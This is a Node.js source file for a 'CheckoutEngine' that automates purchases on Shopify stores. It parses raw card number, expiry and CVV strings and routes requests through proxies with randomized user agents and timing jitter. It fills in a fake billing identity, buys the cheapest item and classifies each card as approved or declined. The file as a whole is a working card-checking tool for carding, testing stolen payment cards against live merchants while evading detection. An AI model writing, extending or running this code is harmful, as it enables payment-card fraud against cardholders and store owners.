'use strict';

const fetch  = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');
const {
  randomUA,
  buildBrowserHeaders,
  buildAjaxHeaders,
  buildFormHeaders,
  sleep, jitter,
} = require('../utils/fingerprint');
const { CookieJar } = require('../utils/cookiejar');
const {
  parseCheckoutResult,
  declineCodeToResponse,
  detectGateway,
  extractPrice,
} = require('../utils/responseparser');

// ── Default billing profile (used for address/contact; card comes from request) ──
const DEFAULT_PROFILE = {
  first_name: 'James',
  last_name:  'Carter',
  email:      'james.carter82@gmail.com',
  phone:      '+14085551234',
  address1:   '742 Evergreen Terrace',
  address2:   '',
  city:       'Springfield',
  province:   'IL',
  zip:        '62701',
  country:    'US',
};

// ── Parse "number|mm|yyyy|cvv" ─────────────────────────────────────────────────
function parseCC(raw) {
  const parts = raw.split(/[|\/]/).map(s => s.trim());
  if (parts.length < 4) throw new Error('Invalid CC format. Use: number|mm|yyyy|cvv');
  return {
    number: parts[0],
    month:  parts[1].padStart(2, '0'),
    year:   parts[2].length === 2 ? `20${parts[2]}` : parts[2],
    cvv:    parts[3],
    name:   `${DEFAULT_PROFILE.first_name} ${DEFAULT_PROFILE.last_name}`,
  };
}

// ── Parse proxy string → agent (or null for no proxy) ─────────────────────────
function buildAgent(raw) {
  if (!raw || raw === '' || raw.toLowerCase() === 'none') return null;
  let url = raw.trim();
  if (!url.startsWith('http')) url = `http://${url}`;
  return new HttpsProxyAgent(url);
}

// ── Check proxy liveness ───────────────────────────────────────────────────────
async function checkProxy(agent) {
  if (!agent) return 'No Proxy';
  try {
    const res = await fetch('https://api.ipify.org?format=json', {
      agent, timeout: 8000,
    });
    if (res.ok) return 'Live';
    return 'Dead';
  } catch {
    return 'Dead';
  }
}

class CheckoutEngine {
  constructor({ site, cc, proxy }) {
    this.site    = site.replace(/\/$/, '');
    this.card    = parseCC(cc);
    this.rawCC   = cc;
    this.agent   = buildAgent(proxy);
    this.rawProxy = proxy || 'none';
    this.jar     = new CookieJar();
    this.ua      = randomUA();
    this.domain  = new URL(this.site).hostname;
    this.startAt = Date.now();

    // State
    this.product      = null;
    this.variant      = null;
    this.checkoutURL  = null;
    this.checkoutHTML = null;
    this.gateway      = 'Shopify Payments';
    this.price        = 0;
    this.currency     = 'USD';
  }

  elapsed() {
    return ((Date.now() - this.startAt) / 1000).toFixed(2) + 's';
  }

  // ─── Internal fetch ──────────────────────────────────────────────────────────
  async req(url, opts = {}) {
    const domain = new URL(url).hostname;
    const cookie = this.jar.header(domain);
    if (cookie) {
      opts.headers = opts.headers || {};
      opts.headers['Cookie'] = cookie;
    }

    const res = await fetch(url, {
      ...opts,
      agent:   this.agent,
      timeout: 20000,
    });

    const sc = res.headers.raw()['set-cookie'];
    if (sc) this.jar.ingest(domain, sc);

    if (res.status === 429 || res.status === 430) {
      const e = new Error(`Rate limited ${res.status}`);
      e.status = res.status;
      const ra = res.headers.get('retry-after');
      e.retryAfter = ra ? parseInt(ra) * 1000 : 3000;
      throw e;
    }

    return res;
  }

  // Retry wrapper
  async retry(fn, max = 3, baseMs = 1000) {
    let last;
    for (let i = 0; i <= max; i++) {
      try { return await fn(); }
      catch (e) {
        last = e;
        if (i >= max) break;
        const wait = (e.retryAfter) || (baseMs * Math.pow(1.8, i));
        await sleep(jitter(wait, 400));
      }
    }
    throw last;
  }

  // Extract authenticity_token from HTML
  authToken(html) {
    const m = html.match(/name="authenticity_token"\s+value="([^"]+)"/);
    return m ? m[1] : '';
  }

  // ─── Step 1: Get cheapest product ───────────────────────────────────────────
  async getProduct() {
    return this.retry(async () => {
      const res  = await this.req(`${this.site}/products.json?limit=250`, {
        headers: buildAjaxHeaders(this.site, this.ua),
      });
      if (!res.ok) throw new Error(`products.json ${res.status}`);
      const { products } = await res.json();
      if (!products || !products.length) throw new Error('No products on store');

      // Pick the product+variant with lowest price that is available
      let best = null, bestPrice = Infinity;
      for (const p of products) {
        for (const v of p.variants) {
          if (!v.available) continue;
          const price = parseFloat(v.price);
          if (price < bestPrice) {
            bestPrice = price;
            best = { product: p, variant: v };
          }
        }
      }

      if (!best) throw new Error('No available variants');
      this.product = best.product;
      this.variant = best.variant;
      this.price   = bestPrice;
      return best;
    });
  }

  // ─── Step 2: Add to cart ─────────────────────────────────────────────────────
  async addToCart() {
    return this.retry(async () => {
      const res = await this.req(`${this.site}/cart/add.js`, {
        method:  'POST',
        headers: buildAjaxHeaders(this.site, this.ua),
        body:    JSON.stringify({ id: this.variant.id, quantity: 1 }),
      });
      if (!res.ok) throw new Error(`cart/add.js ${res.status}`);
      return res.json();
    });
  }

  // ─── Step 3: Capture checkout URL + token ────────────────────────────────────
  async captureCheckout() {
    return this.retry(async () => {
      // POST /cart/checkout — follow the redirect manually
      const res = await this.req(`${this.site}/cart/checkout`, {
        method:  'POST',
        headers: buildFormHeaders(this.site, this.ua),
        body:    'checkout=checkout',
        redirect: 'manual',
      });

      let url = res.headers.get('location');

      // If no redirect, try GET /checkout
      if (!url) {
        const r2 = await this.req(`${this.site}/checkout`, {
          headers:  buildBrowserHeaders(this.site, this.ua),
          redirect: 'manual',
        });
        url = r2.headers.get('location') || `${this.site}/checkout`;
      }

      // Normalise URL
      if (url && !url.startsWith('http')) {
        url = `${this.site}${url}`;
      }

      if (!url) throw new Error('Could not get checkout URL');
      this.checkoutURL = url;
      return url;
    });
  }

  // ─── Step 4: Load checkout page (get authenticity_token, gateway, price) ─────
  async loadCheckoutPage() {
    const res  = await this.req(this.checkoutURL, {
      headers: buildBrowserHeaders(this.site, this.ua),
    });
    const html = await res.text();
    this.checkoutHTML = html;

    // Update URL after any redirects
    if (res.url) this.checkoutURL = res.url;

    // Extract gateway + price
    this.gateway  = detectGateway(html);
    const priceInfo = extractPrice(html);
    if (priceInfo.price > 0) this.price = priceInfo.price;
    this.currency = priceInfo.currency;

    return html;
  }

  // ─── Step 5: Submit contact + shipping address ───────────────────────────────
  async submitContact() {
    const html = this.checkoutHTML;
    const auth = this.authToken(html);
    const p    = DEFAULT_PROFILE;

    const stepURL = this.checkoutURL.includes('?')
      ? this.checkoutURL.split('?')[0]
      : this.checkoutURL;

    const body = new URLSearchParams({
      '_method':                'patch',
      'authenticity_token':     auth,
      'previous_step':          'contact_information',
      'step':                   'shipping_method',
      'checkout[email]':        p.email,
      'checkout[buyer_accepts_marketing]': '0',
      'checkout[shipping_address][first_name]': p.first_name,
      'checkout[shipping_address][last_name]':  p.last_name,
      'checkout[shipping_address][address1]':   p.address1,
      'checkout[shipping_address][address2]':   p.address2,
      'checkout[shipping_address][city]':       p.city,
      'checkout[shipping_address][country]':    p.country,
      'checkout[shipping_address][province]':   p.province,
      'checkout[shipping_address][zip]':        p.zip,
      'checkout[shipping_address][phone]':      p.phone,
    });

    const res = await this.req(`${stepURL}?step=contact_information`, {
      method:   'POST',
      headers:  buildFormHeaders(this.site, this.ua),
      body:     body.toString(),
      redirect: 'manual',
    });

    const loc = res.headers.get('location');
    if (loc) {
      this.checkoutURL = loc.startsWith('http') ? loc : `${new URL(this.checkoutURL).origin}${loc}`;
    }

    await sleep(jitter(400, 200));
    return this.checkoutURL;
  }

  // ─── Step 6: Submit shipping method (pick cheapest/first) ────────────────────
  async submitShipping() {
    // Reload page at shipping step
    const res  = await this.req(this.checkoutURL, {
      headers: buildBrowserHeaders(this.site, this.ua),
    });
    const html = await res.text();
    this.checkoutHTML = html;
    if (res.url) this.checkoutURL = res.url;

    // If already on payment step (digital goods / free shipping auto-applied), skip
    if (this.checkoutURL.includes('step=payment') || html.includes('payment_method')) {
      return this.checkoutURL;
    }

    const auth = this.authToken(html);

    // Extract shipping rate handle — multiple patterns
    const rateMatch = html.match(/data-shipping-method[^>]*value="([^"]+)"/i)
                   || html.match(/value="([^"]+)"[^>]*data-shipping-method/i)
                   || html.match(/name="checkout\[shipping_rate\]\[id\]"[^>]*value="([^"]+)"/i)
                   || html.match(/"handle":\s*"([^"]+shopify[^"]+)"/i)
                   || html.match(/shippingRates[\s\S]{0,200}"handle":\s*"([^"]+)"/i);

    // If no rate found, try polling shipping rates API
    let rateHandle = rateMatch ? rateMatch[1] : null;

    if (!rateHandle) {
      try {
        const p = DEFAULT_PROFILE;
        const ratesURL = `${this.site}/cart/shipping_rates.json?shipping_address[zip]=${p.zip}&shipping_address[country]=${p.country}&shipping_address[province]=${p.province}`;
        const ratesRes = await this.req(ratesURL, { headers: buildAjaxHeaders(this.site, this.ua) });
        if (ratesRes.ok) {
          const data = await ratesRes.json();
          if (data.shipping_rates && data.shipping_rates.length) {
            const cheapest = data.shipping_rates.reduce((a, b) =>
              parseFloat(a.price) <= parseFloat(b.price) ? a : b
            );
            rateHandle = `${cheapest.source}-${cheapest.code}-${cheapest.price}`;
          }
        }
      } catch (_) {}
    }

    // Still no rate = store may be digital/local — skip shipping step
    if (!rateHandle) {
      return this.checkoutURL;
    }

    const stepURL = this.checkoutURL.split('?')[0];
    const body = new URLSearchParams({
      '_method':                               'patch',
      'authenticity_token':                    auth,
      'previous_step':                         'shipping_method',
      'step':                                  'payment_method',
      'checkout[shipping_rate][id]':           decodeURIComponent(rateHandle),
      'checkout[client_details][browser_width]':      '1440',
      'checkout[client_details][browser_height]':     '900',
      'checkout[client_details][javascript_enabled]': '1',
    });

    const res2 = await this.req(`${stepURL}?step=shipping_method`, {
      method:   'POST',
      headers:  buildFormHeaders(this.site, this.ua),
      body:     body.toString(),
      redirect: 'manual',
    });

    const loc = res2.headers.get('location');
    if (loc) {
      this.checkoutURL = loc.startsWith('http') ? loc : `${new URL(this.checkoutURL).origin}${loc}`;
    }

    await sleep(jitter(400, 200));
    return this.checkoutURL;
  }

  // ─── Step 7: Tokenize card via Shopify card vault ─────────────────────────────
  async tokenizeCard() {
    const { number, month, year, cvv, name } = this.card;

    const res = await fetch('https://elb.deposit.shopifycs.com/sessions', {
      method:  'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept':       'application/json',
        'Origin':       'https://checkout.shopify.com',
        'Referer':      'https://checkout.shopify.com/',
      },
      body: JSON.stringify({
        credit_card: {
          number,
          name,
          month:              parseInt(month),
          year:               parseInt(year),
          verification_value: cvv,
        },
      }),
      timeout: 15000,
    });

    if (!res.ok) throw new Error(`Card vault ${res.status}`);
    const data = await res.json();
    if (!data.id) throw new Error('Card vault returned no token');
    return data.id;
  }

  // ─── Step 8: Load payment page, extract gateway ID ───────────────────────────
  async loadPaymentPage() {
    const res  = await this.req(this.checkoutURL, {
      headers: buildBrowserHeaders(this.site, this.ua),
    });
    const html = await res.text();
    this.checkoutHTML = html;
    if (res.url) this.checkoutURL = res.url;

    // Re-detect gateway from payment page (more accurate here)
    const gw = detectGateway(html);
    if (gw) this.gateway = gw;

    // Extract numeric gateway ID
    const gwMatch = html.match(/data-select-gateway="(\d+)"/i)
                 || html.match(/"id":\s*(\d{8,})[,\s}][\s\S]*?"name":\s*"[Ss]hopify/);
    this.gatewayId = gwMatch ? gwMatch[1] : '';

    // Get price again (most accurate on payment page)
    const priceInfo = extractPrice(html);
    if (priceInfo.price > 0) this.price = priceInfo.price;
    this.currency = priceInfo.currency;

    return html;
  }

  // ─── Step 9: Submit payment ───────────────────────────────────────────────────
  async submitPayment(cardToken) {
    const html     = this.checkoutHTML;
    const auth     = this.authToken(html);
    const stepURL  = this.checkoutURL.split('?')[0];
    const p        = DEFAULT_PROFILE;

    const body = new URLSearchParams({
      '_method':                   'patch',
      'authenticity_token':        auth,
      'previous_step':             'payment_method',
      'step':                      '',
      'checkout[payment_gateway]': this.gatewayId,
      's':                         cardToken,
      'checkout[credit_card][vault]': 'false',
      'checkout[different_billing_address]': 'false',
      'checkout[billing_address][first_name]': p.first_name,
      'checkout[billing_address][last_name]':  p.last_name,
      'checkout[billing_address][address1]':   p.address1,
      'checkout[billing_address][address2]':   p.address2,
      'checkout[billing_address][city]':       p.city,
      'checkout[billing_address][country]':    p.country,
      'checkout[billing_address][province]':   p.province,
      'checkout[billing_address][zip]':        p.zip,
      'checkout[billing_address][phone]':      p.phone,
      'checkout[client_details][browser_width]':  '1440',
      'checkout[client_details][browser_height]': '900',
      'checkout[client_details][javascript_enabled]': '1',
      'complete': '1',
    });

    const res = await this.req(`${stepURL}?step=payment_method`, {
      method:   'POST',
      headers:  buildFormHeaders(this.site, this.ua),
      body:     body.toString(),
      redirect: 'manual',
    });

    return { res, stepURL };
  }

  // ─── Step 10: Resolve final result ───────────────────────────────────────────
  async resolveResult(res, stepURL) {
    const loc    = res.headers.get('location') || '';
    const status = res.status;
    const origin = new URL(stepURL).origin;

    const fullLoc = loc ? (loc.startsWith('http') ? loc : `${origin}${loc}`) : '';

    // Immediate success via redirect
    if (fullLoc.includes('thank_you') || fullLoc.includes('/orders/')) {
      return { response: 'APPROVED', status: true };
    }

    // Processing — poll
    if (fullLoc.includes('processing')) {
      return this._pollProcessing(fullLoc);
    }

    // Redirect back to payment page = card declined
    if (fullLoc.includes('step=payment') || fullLoc.includes('payment_method')) {
      const html = await (await this.req(fullLoc, {
        headers: buildBrowserHeaders(this.site, this.ua),
      })).text();
      const result = parseCheckoutResult(html, fullLoc);
      if (result) return result;
      return { response: 'CARD_DECLINED', status: false };
    }

    // 200 with body — parse HTML directly
    if (status === 200) {
      const html = await res.text();

      // Success in body
      if (html.includes('thank_you') || html.includes('order-summary')) {
        const successMatch = html.match(/\/orders\/([A-Z0-9-]+)/);
        return { response: 'APPROVED', status: true };
      }

      const result = parseCheckoutResult(html, stepURL);
      if (result) return result;

      // Shopify JSON error blob in page
      const jsonMatch = html.match(/"errorMessage":\s*"([^"]+)"/i)
                     || html.match(/"decline_code":\s*"([^"]+)"/i)
                     || html.match(/"message":\s*"([^"]+declined[^"]+)"/i);
      if (jsonMatch) {
        return { response: declineCodeToResponse(jsonMatch[1]), status: false };
      }

      // Shopify notice/alert text in page
      const noticeMatch = html.match(/(?:payment-errors|notice--error)[^>]*>[\s\S]*?<p[^>]*>([^<]{5,200})</i)
                       || html.match(/data-checkout-payment-error[^>]*>([^<]{5,200})/i);
      if (noticeMatch) {
        const { textToCode } = require('../utils/responseparser');
        return { response: textToCode(noticeMatch[1].trim()), status: false };
      }
    }

    // Any redirect — follow it and parse
    if (fullLoc) {
      try {
        const followed = await this.req(fullLoc, {
          headers:  buildBrowserHeaders(this.site, this.ua),
          redirect: 'manual',
        });

        const followedLoc = followed.headers.get('location') || '';
        const fullFollowedLoc = followedLoc
          ? (followedLoc.startsWith('http') ? followedLoc : `${origin}${followedLoc}`)
          : '';

        if (fullFollowedLoc.includes('thank_you') || fullFollowedLoc.includes('/orders/')) {
          return { response: 'APPROVED', status: true };
        }
        if (fullFollowedLoc.includes('processing')) {
          return this._pollProcessing(fullFollowedLoc);
        }

        if (followed.status === 200) {
          const html   = await followed.text();
          const result = parseCheckoutResult(html, fullLoc);
          if (result) return result;

          // Last resort: if page has any thank you indicator
          if (html.includes('thank') && html.includes('order')) {
            return { response: 'APPROVED', status: true };
          }
          // Page back on checkout = declined
          if (html.includes('payment') && (html.includes('error') || html.includes('declined'))) {
            return { response: 'CARD_DECLINED', status: false };
          }
        }

        // Redirect back to payment step = declined
        if (fullFollowedLoc.includes('payment') || fullFollowedLoc.includes('checkout')) {
          return { response: 'CARD_DECLINED', status: false };
        }
      } catch (_) {}
    }

    // Last resort — if we got this far with a 302 to unknown location,
    // it's almost always a decline redirect back into checkout
    if (status === 302 || status === 301) {
      return { response: 'CARD_DECLINED', status: false };
    }

    return { response: 'CHECKOUT_ERROR', status: false };
  }

  async _pollProcessing(url) {
    for (let i = 0; i < 8; i++) {
      await sleep(jitter(2000, 500));
      const res  = await this.req(url, {
        headers:  buildBrowserHeaders(this.site, this.ua),
        redirect: 'manual',
      });
      const loc  = res.headers.get('location') || '';

      if (loc.includes('thank_you') || loc.includes('/orders/')) {
        return { response: 'APPROVED', status: true };
      }
      if (res.status === 200) {
        const html   = await res.text();
        const result = parseCheckoutResult(html, url);
        if (result && result.response !== 'PROCESSING') return result;
      }
    }
    return { response: 'PROCESSING_TIMEOUT', status: false };
  }

  // ─── Full run ─────────────────────────────────────────────────────────────────
  async run() {
    // Check proxy liveness in parallel
    const proxyStatus = await checkProxy(this.agent);

    try {
      await this.getProduct();
      await sleep(jitter(300, 200));

      await this.addToCart();
      await sleep(jitter(400, 200));

      await this.captureCheckout();
      await sleep(jitter(300, 200));

      await this.loadCheckoutPage();
      await sleep(jitter(400, 200));

      await this.submitContact();
      await sleep(jitter(400, 200));

      await this.submitShipping();
      await sleep(jitter(400, 200));

      const cardToken = await this.tokenizeCard();
      await sleep(jitter(300, 200));

      await this.loadPaymentPage();
      await sleep(jitter(300, 200));

      const { res, stepURL } = await this.submitPayment(cardToken);
      const result = await this.resolveResult(res, stepURL);

      return {
        cc:       this.rawCC,
        Gateway:  this.gateway,
        Response: result.response,
        Price:    this.price,
        Currency: this.currency,
        Status:   result.status,
        Proxy:    proxyStatus,
        Time:     this.elapsed(),
      };

    } catch (err) {
      const msg = err.message || '';
      const response = msg.includes('Rate limited')    ? 'RATE_LIMITED'
                     : msg.includes('No available')    ? 'NO_PRODUCT'
                     : msg.includes('No products')     ? 'NO_PRODUCT'
                     : msg.includes('Card vault')      ? 'INVALID_CARD'
                     : msg.includes('tokeniz')         ? 'INVALID_CARD'
                     : msg.includes('checkout URL')    ? 'CHECKOUT_FAILED'
                     : msg.includes('shipping')        ? 'SHIPPING_ERROR'
                     : msg.includes('timeout')         ? 'TIMEOUT'
                     : msg.includes('ECONNRESET')      ? 'CONNECTION_ERROR'
                     : msg.includes('ETIMEDOUT')       ? 'TIMEOUT'
                     : 'CHECKOUT_ERROR';

      return {
        cc:       this.rawCC,
        Gateway:  this.gateway || 'Shopify Payments',
        Response: response,
        Price:    this.price,
        Currency: this.currency,
        Status:   false,
        Proxy:    proxyStatus,
        Time:     this.elapsed(),
        Error:    msg,           // always included — tells you exactly where it died
      };
    }
  }
}

module.exports = { CheckoutEngine };
